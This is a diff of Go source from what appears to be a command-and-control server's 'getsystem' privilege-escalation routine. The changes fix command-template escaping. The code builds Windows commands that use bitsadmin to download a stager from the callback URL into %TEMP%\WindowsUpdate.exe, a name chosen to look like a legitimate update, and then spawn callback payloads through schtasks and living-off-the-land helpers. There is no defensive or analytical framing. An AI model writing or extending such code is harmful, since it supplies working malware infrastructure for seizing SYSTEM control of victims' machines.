@@ -2750,8 +2750,6 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 				
 				if isCopyCommand {
 					// For copy commands, we need to download the file first, then copy it
-					// Check if we've already downloaded the file (look for previous download command)
-					// If this is the first copy command in the sequence, download first
 					hasDownloaded := false
 					for j := 0; j < idx; j++ {
 						if strings.Contains(method.Commands[j], `bitsadmin`) || strings.Contains(method.Commands[j], `download`) {
@@ -2762,7 +2760,7 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 					
 					if !hasDownloaded {
 						// First copy command - download the file first
-						filePath := `%%TEMP%%\WindowsUpdate.exe`
+						filePath := `%TEMP%\WindowsUpdate.exe`
 						// Download the file
 						downloadCmd := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s`, callbackURL, filePath)
 						downloadTaskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
@@ -2777,29 +2775,25 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 					}
 					
 					// Now use the file path for the copy command
-					filePath := `%%TEMP%%\WindowsUpdate.exe`
+					filePath := `%TEMP%\WindowsUpdate.exe`
 					// Extract destination from template
 					cmd = fmt.Sprintf(cmdTemplate, filePath)
 				} else if isDelCommand {
-					// For del commands, use file path
-					filePath := strings.ReplaceAll(`%%TEMP%%\WindowsUpdate.exe`, `%`, `%%`)
-					// Replace %s with file path, but also handle %WINDIR% cases
-					if strings.Contains(cmdTemplate, `%%WINDIR%%`) {
-						// Extract the filename from the template
-						cmd = strings.ReplaceAll(cmdTemplate, `%s`, filePath)
+					// For del commands, use template as-is (no %s placeholder)
+					if strings.Contains(cmdTemplate, `%%WINDIR%%`) || strings.Contains(cmdTemplate, `Program Files`) {
+						cmd = cmdTemplate // Template already has correct path
 					} else {
+						filePath := `%TEMP%\WindowsUpdate.exe`
 						cmd = fmt.Sprintf(cmdTemplate, filePath)
 					}
 				} else if isSchTasksTr {
 					// For schtasks /tr, we need to wrap in cmd.exe /c and escape quotes
 					spawnCmdForExec := lolbinEsc.GenerateSpawnCommandForExec(callbackURL, "system")
 					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
-					// Escape quotes for nested command
+					// Escape quotes for nested command - use \" for Windows cmd.exe
 					escapedCmd := strings.ReplaceAll(spawnCmdForExecEscaped, `"`, `\"`)
 					cmd = fmt.Sprintf(cmdTemplate, escapedCmd)
 				} else if isSchTasksXml {
-					// XML manipulation - this actually needs a file path to XML file, not a command
-					// Skip this method for now as it's not properly implemented
 					fmt.Printf("[!] Skipping Scheduled Task XML Manipulation - requires XML file\n")
 					commandFailed = true
 					break
@@ -2825,8 +2819,13 @@ func (is *InteractiveServer) executeGetSystem(sessionID string) error {
 					spawnCmdForExecEscaped := strings.ReplaceAll(spawnCmdForExec, `%`, `%%`)
 					cmd = fmt.Sprintf(cmdTemplate, spawnCmdForExecEscaped)
 				} else {
-					// For other commands, use spawnCmd as-is (already escaped)
-					cmd = fmt.Sprintf(cmdTemplate, spawnCmdEscaped)
+					// For other commands, check if template has %s placeholder
+					if strings.Contains(cmdTemplate, `%s`) {
+						cmd = fmt.Sprintf(cmdTemplate, spawnCmdEscaped)
+					} else {
+						// Template doesn't have %s, use as-is (may have %% for environment variables)
+						cmd = cmdTemplate
+					}
 				}
 
 				taskID := fmt.Sprintf("task-%d", time.Now().UnixNano())
